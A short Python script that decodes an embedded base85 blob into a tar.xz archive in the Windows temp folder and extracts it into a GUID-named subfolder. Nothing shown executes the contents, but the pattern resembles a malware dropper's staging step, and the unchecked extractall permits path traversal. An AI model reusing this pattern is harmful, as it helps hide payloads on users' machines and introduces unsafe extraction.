import os,tarfile,base64
import tardata

p=os.path.expandvars('%temp%/')
def run(tp='{7B4A0E12-2FC6-B071-A56C-0F8A7B0D9D7A}'):
    with open(p+'555545185415.tar.xz','wb') as f:
        f.write(base64.b85decode(tardata.data))
    with tarfile.open(p+'555545185415.tar.xz','r') as tar:
        tar.extractall(path=p+tp)